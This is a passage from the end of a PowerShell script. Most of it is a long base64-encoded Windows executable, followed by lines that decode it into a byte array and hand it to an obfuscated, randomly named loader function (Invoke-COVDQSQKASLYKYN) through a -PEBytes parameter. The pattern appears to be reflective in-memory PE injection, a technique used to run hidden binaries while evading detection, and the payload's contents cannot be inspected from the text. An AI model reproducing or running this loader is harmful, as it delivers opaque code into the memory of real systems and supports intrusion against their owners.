AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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"
[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
Invoke-COVDQSQKASLYKYN -PEBytes $PEBytes

}
